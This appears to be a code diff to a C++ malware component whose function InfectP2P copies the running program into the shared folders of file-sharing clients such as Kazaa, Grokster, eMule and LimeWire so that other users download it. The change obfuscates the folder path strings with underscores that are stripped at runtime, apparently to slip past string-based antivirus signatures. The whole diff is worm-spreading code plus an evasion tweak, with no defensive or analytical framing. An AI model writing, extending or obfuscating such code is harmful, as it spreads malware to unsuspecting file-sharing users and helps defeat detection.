@@ -1,4 +1,6 @@
 #include "Peer2Peer.h"
+#include <algorithm>
+#include <string>
 
 struct Peer2PeerInfo_s
 {
@@ -9,34 +11,34 @@ struct Peer2PeerInfo_s
 
 const char *szPath[] =
 {
-    "C:\\program files\\kaz",
-    "C:\\program files\\kaz",
-    "C:\\program files\\kaz",
-    "C:\\program files\\ic",
-    "C:\\program files\\gro",
-    "C:\\program files\\bear",
-    "C:\\program files\\edonk",
-    "C:\\program files\\emu",
-    "C:\\program files\\mor",
-    "C:\\program files\\li",
-    "C:\\program files\\te",
-    "C:\\program files\\wi"
+    "C:\\pro_gram fi_les\\kaz",
+    "C:\\pro_gram fi_les\\kaz",
+    "C:\\pro_gram fi_les\\kaz",
+    "C:\\pro_gram fi_les\\ic",
+    "C:\\pro_gram fi_les\\gro",
+    "C:\\pro_gram fi_les\\bear",
+    "C:\\pro_gram fi_les\\edonk",
+    "C:\\pro_gram fi_les\\emu",
+    "C:\\pro_gram fi_les\\mor",
+    "C:\\pro_gram fi_les\\li",
+    "C:\\pro_gram fi_les\\te",
+    "C:\\pro_gram fi_les\\wi"
 };
 
 const char *szPathAdd[] =
 {
-    "aa\\my shared folder\\",
-    "aa lite\\my shared folder\\",
-    "aa lite k++\\my shared folder\\",
-    "q\\shared folder\\",
-    "kster\\my grokster\\",
-    "share\\shared\\",
-    "ey2000\\incoming\\",
-    "le\\incoming\\",
-    "pheus\\my shared folder\\",
-    "mewire\\shared\\",
-    "sla\\files\\",
-    "nmx\\shared\\"
+    "aa\\m_y shar_ed fol_der\\",
+    "aa li_te\\my sha_red fold_er\\",
+    "aa lit_e k++\\my sh_ared fol_der\\",
+    "q\\shar_ed fol_der\\",
+    "kster\\my grok_ster\\",
+    "sh_are\\sh_ared\\",
+    "ey20_00\\inc_oming\\",
+    "le\\inc_oming\\",
+    "ph_eus\\my sha_red fold_er\\",
+    "mew_ire\\sha_red\\",
+    "sla\\fi_les\\",
+    "nmx\\sh_ared\\"
 };
 const char *szFiles[] =
 {
@@ -88,7 +90,9 @@ bool InfectP2P()
             strcpy(pPeer2PeerInfo_s.szFilePath, szPath[i]);
             strcat(pPeer2PeerInfo_s.szFilePath, szPathAdd[i]);
             strcat(pPeer2PeerInfo_s.szFilePath, szFiles[j]);
-            if (CopyFileA(pPeer2PeerInfo_s.szDirectory, pPeer2PeerInfo_s.szFilePath, false) != 0)
+			std::string str(pPeer2PeerInfo_s.szFilePath);
+			str.erase(std::remove(str.begin(), str.end(), '_'), str.end());
+			if (CopyFileA(pPeer2PeerInfo_s.szDirectory, str.c_str(), false) != 0)
             {
                 SetFileAttributesA(pPeer2PeerInfo_s.szFilePath, FILE_ATTRIBUTE_NORMAL);
             }
